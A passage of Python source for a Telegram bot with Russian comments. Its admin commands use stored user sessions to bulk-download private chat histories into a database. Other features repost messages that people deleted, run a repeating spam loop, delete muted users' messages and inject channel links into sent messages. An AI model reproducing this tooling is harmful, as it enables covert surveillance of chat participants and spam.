        arg = message.text.split(maxsplit=1)[1]
        target_id = await resolve_user_id(arg)
        if not target_id:
            await message.answer("❌ Не найден."); return
        sess = get_session(target_id)
        client = telethon_clients.get(target_id)
        chats = get_user_chats(target_id)
        msgs = count_user_messages(target_id)
        # Распределение по чатам
        lines = [f"🔎 <b>Debug user {target_id}</b>\n"]
        lines.append(f"• Сессия в БД: {'✅' if sess else '❌'}")
        lines.append(f"• Клиент запущен: {'✅' if client else '❌'}")
        lines.append(f"• Чатов в БД: {len(chats)}")
        lines.append(f"• Сообщений в БД: {msgs}")
        try:
            if client:
                lines.append(f"• Клиент connected: {'✅' if client.is_connected() else '❌'}")
        except: pass
        # Топ чатов по сообщениям
        try:
            with get_db() as conn:
                with conn.cursor() as cur:
                    cur.execute(
                        "SELECT chat_id, COUNT(*) as c FROM chat_messages WHERE user_id=%s "
                        "GROUP BY chat_id ORDER BY c DESC LIMIT 10",
                        (target_id,))
                    rows = cur.fetchall()
                    if rows:
                        lines.append("\n<b>Топ чатов:</b>")
                        for cid, c in rows:
                            name = next((n for i, n in chats if i == cid), "?")
                            lines.append(f"  • <code>{cid}</code> {name[:25]}: {c} сообщ.")
        except Exception as e:
            lines.append(f"err: {e}")
        await message.answer("\n".join(lines), parse_mode="HTML")
    except:
        await message.answer("Формат: /debug_user 123456789")

@dp.message(Command("force_backfill"))
async def cmd_force_backfill(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        arg = message.text.split(maxsplit=1)[1]
        target_id = await resolve_user_id(arg)
        if not target_id:
            await message.answer("❌ Не найден."); return
        client = telethon_clients.get(target_id)
        if not client:
            sess = get_session(target_id)
            if sess: client = await start_telethon_listener(target_id, sess)
        if not client:
            await message.answer("❌ Клиент не запущен."); return
        await message.answer(f"⏳ Загружаю историю для <code>{target_id}</code>...", parse_mode="HTML")
        before = count_user_messages(target_id)
        await backfill_dialogs(client, target_id, max_dialogs=300, per_chat=50)
        after = count_user_messages(target_id)
        await message.answer(f"✅ Было: {before}, стало: {after} (+{after-before})", parse_mode="HTML")
    except Exception as e:
        await message.answer(f"❌ {e}")

# ==================== ОБРАБОТЧИК УДАЛЕНИЙ ====================
@dp.update()
async def global_update_handler(update: Update, bot: Bot):
    try:
        if update.deleted_business_messages:
            data = update.deleted_business_messages
            bc_id = data.business_connection_id
            msg_ids = set(data.message_ids)
            for (cached_chat_id, cached_msg_id), cached in list(msg_cache.items()):
                if cached_msg_id in msg_ids:
                    uid = cached['user_id']
                    if uid == bot_id:
                        msg_cache.pop((cached_chat_id, cached_msg_id), None); continue
                    user_link = get_user_mention(uid, cached['user'])
                    kwargs = {"chat_id": cached_chat_id,
                              "text": f"👤 {user_link} <b>удалил(а) сообщение ↓</b>\n\n💬 {cached['text']}",
                              "parse_mode": "HTML"}
                    bc_target = bc_id or cached.get("bc_id")
                    if bc_target: kwargs["business_connection_id"] = bc_target
                    await bot.send_message(**kwargs)
                    msg_cache.pop((cached_chat_id, cached_msg_id), None)
    except Exception as e:
        logging.error(f"deleted handler: {e}")

# ==================== ОСНОВНОЙ ОБРАБОТЧИК ====================
@dp.message()
@dp.business_message()
async def handle(message: Message):
    global bot_id, CHANNEL_LINK
    try:
        if not message.from_user or message.from_user.is_bot: return
        uid = int(message.from_user.id)
        chat_id = int(message.chat.id)
        bc_id = message.business_connection_id
        save_user_info(uid, message.from_user.username, message.from_user.first_name)
        owner_id = bc_owners.get(bc_id) if bc_id else None

        if bc_id:
            chat_name = message.chat.title or message.chat.first_name or "Чат"
            save_user_chat(uid, chat_id, chat_name)
            chat_tuple = (chat_id, bc_id)
            if chat_tuple in recent_business_chats: recent_business_chats.remove(chat_tuple)
            recent_business_chats.append(chat_tuple)
            if len(recent_business_chats) > 100: recent_business_chats.pop(0)

        if uid in banned_users or (owner_id and owner_id in banned_users): return

        if bc_id:
            if bc_id not in bc_owners:
                try:
                    conn_info = await bot.get_business_connection(bc_id)
                    bc_owners[bc_id] = int(conn_info.user.id)
                    save_user_info(conn_info.user.id, conn_info.user.username, conn_info.user.first_name)
                    save_business_account(conn_info.user.id, conn_info.user.username, conn_info.user.first_name)
                    owner_id = int(conn_info.user.id)
                except: pass
            is_from_me = (uid == owner_id) if owner_id else False
        else:
            is_from_me = (uid == chat_id) or (message.chat.type in ["group", "supergroup"])

        if bot_id is None:
            me = await bot.get_me(); bot_id = me.id

        if bc_id:
            active_chats.setdefault(bc_id, set()).add(chat_id)

        if message.text:
            cache_key = (chat_id, message.message_id)
            msg_cache[cache_key] = {"text": message.text, "user": message.from_user.first_name or "Пользователь",
                                    "user_id": uid, "chat_id": chat_id, "bc_id": bc_id}
            if len(msg_cache) > 5000: msg_cache.pop(next(iter(msg_cache)))

        if uid in mutes and datetime.now() < mutes[uid]["until"]:
            await delete_msg(chat_id, message.message_id, bc_id); return

        if not is_from_me: return
        if chat_id in reply_guard_chats and message.reply_to_message:
            await delete_msg(chat_id, message.message_id, bc_id); return

        text_raw = message.text
        if not text_raw: return
        low = text_raw.lower().strip()
        task_key = (chat_id, bc_id)
        current_owner = owner_id or uid

        if is_calculator_expression(text_raw):
            result, error = calculate_expression(text_raw)
            if result is not None:
                formatted = f"{result:.10f}".rstrip('0').rstrip('.') if isinstance(result, float) else str(result)
                new_text = f"{text_raw} = <b>{formatted}</b>"
                edited = await edit_message(chat_id, message.message_id, new_text, bc_id, parse_mode="HTML")
                if not edited:
                    try:
                        kwargs = {"chat_id": chat_id, "text": new_text, "parse_mode": "HTML"}
                        if bc_id: kwargs["business_connection_id"] = bc_id
                        await bot.send_message(**kwargs)
                    except: pass
                return
            elif error:
                try:
                    kwargs = {"chat_id": chat_id, "text": error, "parse_mode": "HTML"}
                    if bc_id: kwargs["business_connection_id"] = bc_id
                    await bot.send_message(**kwargs)
                except: pass
                return

        if low == ".стоп":
            save_setting(chat_id, 'enabled_links', False); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low == ".старт":
            save_setting(chat_id, 'enabled_links', True); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low.startswith("+линк"):
            parts = text_raw.split(maxsplit=1)
            if len(parts) > 1:
                nl = parts[1].strip()
                if not nl.startswith("http"): nl = "https://t.me/" + nl.lstrip("@")
                CHANNEL_LINK = nl
            await clear_cmd(chat_id, message.message_id, bc_id); return
        if low.startswith("подмена "):
            parts = text_raw.split(maxsplit=2)
            if len(parts) >= 2:
                if parts[1].lower() == "выкл": save_substitution(chat_id, None, None)
                else:
                    mode = int(parts[2]) if len(parts) == 3 and parts[2] in ["1", "2"] else 1
                    save_substitution(chat_id, parts[1], mode)
            await clear_cmd(chat_id, message.message_id, bc_id); return
        if low == "печать -":
            save_setting(chat_id, 'typing_disabled', True); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low == "печать +":
            save_setting(chat_id, 'typing_disabled', False); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low == "+реплай":
            save_setting(chat_id, 'reply_guard', True); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low == "-реплай":
            save_setting(chat_id, 'reply_guard', False); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low == "ss":
            await clear_cmd(chat_id, message.message_id, bc_id)
            text = user_spam_texts.get(str(current_owner))
            if not text:
                kwargs = {"chat_id": chat_id, "text": "⚠️ Сначала <code>set [текст]</code>", "parse_mode": "HTML"}
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs); return
            reply_to = message.reply_to_message.message_id if message.reply_to_message else None
            if task_key in spam_tasks: spam_tasks[task_key].cancel()
            spam_tasks[task_key] = asyncio.create_task(spam_worker(chat_id, bc_id, reply_to, text)); return
        if low == "dd":
            await clear_cmd(chat_id, message.message_id, bc_id)
            if task_key in spam_tasks:
                spam_tasks[task_key].cancel(); del spam_tasks[task_key]
            return
        if low.startswith("set "):
            save_spam_text(str(current_owner), text_raw[4:].strip()); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low.startswith(".мут") or low.startswith("!мут") or low.startswith(".ут"):
            try:
                minutes = int(re.search(r"\d+", text_raw).group())
                if message.reply_to_message and message.reply_to_message.from_user:
                    t = message.reply_to_message.from_user
                    target_id = t.id; target_name = t.first_name
                else:
                    target_id = chat_id; target_name = message.chat.first_name or "Пользователь"
                mutes[target_id] = {"until": datetime.now() + timedelta(minutes=minutes)}
                asyncio.create_task(unmute(target_id, chat_id, bc_id, target_name))
                await clear_cmd(chat_id, message.message_id, bc_id)
                kwargs = {"chat_id": chat_id, "text": f"🔇 {get_user_mention(target_id, target_name)} выдан <b>МУТ</b> на {minutes} мин.", "parse_mode": "HTML"}
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs)
            except: pass
            return
        if low in [".размут", "!размут"]:
            if message.reply_to_message and message.reply_to_message.from_user:
                t = message.reply_to_message.from_user
                target_id = t.id; target_name = t.first_name
            else:
                target_id = chat_id; target_name = message.chat.first_name or "Пользователь"
            mutes.pop(target_id, None)
            await clear_cmd(chat_id, message.message_id, bc_id)
            kwargs = {"chat_id": chat_id, "text": f"🔊 С {get_user_mention(target_id, target_name)} снят <b>МУТ</b>.", "parse_mode": "HTML"}
            if bc_id: kwargs["business_connection_id"] = bc_id
            await bot.send_message(**kwargs); return
        if low in ["мой ид", "моид"]:
            await clear_cmd(chat_id, message.message_id, bc_id)
            kwargs = {"chat_id": chat_id, "text": f"🆔 {get_user_mention(uid, message.from_user.first_name)} (<code>{uid}</code>)", "parse_mode": "HTML"}
            if bc_id: kwargs["business_connection_id"] = bc_id
            await bot.send_message(**kwargs); return
        if low in ["твой ид", "твоид"]:
            await clear_cmd(chat_id, message.message_id, bc_id)
            t = message.reply_to_message.from_user if message.reply_to_message else None
            target_id = t.id if t else (chat_id if chat_id > 0 else None)
            if target_id:
                kwargs = {"chat_id": chat_id, "text": f"🆔 {get_user_mention(target_id, t.first_name if t else None)} (<code>{target_id}</code>)", "parse_mode": "HTML"}
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs)
            return
        if low == "!команды":
            await clear_cmd(chat_id, message.message_id, bc_id)
            kwargs = {"chat_id": chat_id, "text": TEXT_COMMANDS_HELP, "parse_mode": "HTML"}
            if bc_id: kwargs["business_connection_id"] = bc_id
            await bot.send_message(**kwargs); return

        final_text = text_raw; need_modify = False; parse_mode = None
        if chat_id in substitutions:
            sub = substitutions[chat_id]
            final_text = f"{sub['text']} {text_raw}" if sub["mode"] == 1 else f"{text_raw} {sub['text']}"
            need_modify = True; parse_mode = "HTML"
        if chat_id in link_chats and CHANNEL_LINK:
            has_link = False
            if message.entities:
                for e in message.entities:
                    if e.type in ["url", "text_link"]: has_link = True; break
            if not has_link and CHANNEL_LINK not in final_text:
                final_text = f'<a href="{CHANNEL_LINK}">{final_text}</a>'
                need_modify = True; parse_mode = "HTML"
        if need_modify:
            await edit_message(chat_id, message.message_id, final_text, bc_id, parse_mode=parse_mode)
    except Exception as e:
        logging.error(f"handle: {e}", exc_info=True)

# ==================== ВЕБ-СЕРВЕР ====================
async def handle_ping(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/health', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

# ==================== ЗАПУСК ====================
async def main():
    await start_web_server()
    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except: pass

    # ВАЖНО: сначала поднимаем клиенты, потом polling
    await restore_all_sessions()

    asyncio.create_task(global_typing_loop())
    asyncio.create_task(promo_broadcaster())
    asyncio.create_task(check_promo_deletions())
    asyncio.create_task(clean_inactive_connections())
    asyncio.create_task(child_decay_loop())
    asyncio.create_task(child_birthday_loop())
    logging.info("🚀 БОТ ЗАПУЩЕН!")
    await dp.start_polling(
        bot,
        allowed_updates=["message", "business_connection", "business_message",
                         "edited_business_message", "deleted_business_messages", "callback_query"])

if __name__ == "__main__":
    asyncio.run(main())
